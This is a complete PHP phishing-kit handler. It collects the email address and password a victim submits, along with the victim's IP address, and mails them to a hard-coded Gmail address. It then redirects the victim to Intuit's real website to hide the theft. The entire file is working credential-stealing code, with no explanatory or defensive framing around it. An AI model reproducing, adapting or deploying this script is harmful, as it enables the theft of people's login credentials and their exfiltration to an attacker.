<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------T Rezultat-----------------------\n";
$message .= "Email.::::::::::::: ".$_POST['userid']."\n";
$message .= "Pass.::::::::::::::: ".$_POST['password']."\n";
$message .= "IP.::::::::::::::::::::: ".$ip."\n";
$message .= "---------------Re-Modified By nONE-------\n";


$recipient ="razyanni78@gmail.com";
$subject = "T ReZulT";
$headers = "Cached@Alone.Spam";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($recipient);
foreach ($arr as $recipient)
{$carca = mail($recipient,$subject,$message,$headers);}
if ($carca)
	   {
		   header("Location: https://www.intuit.com/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>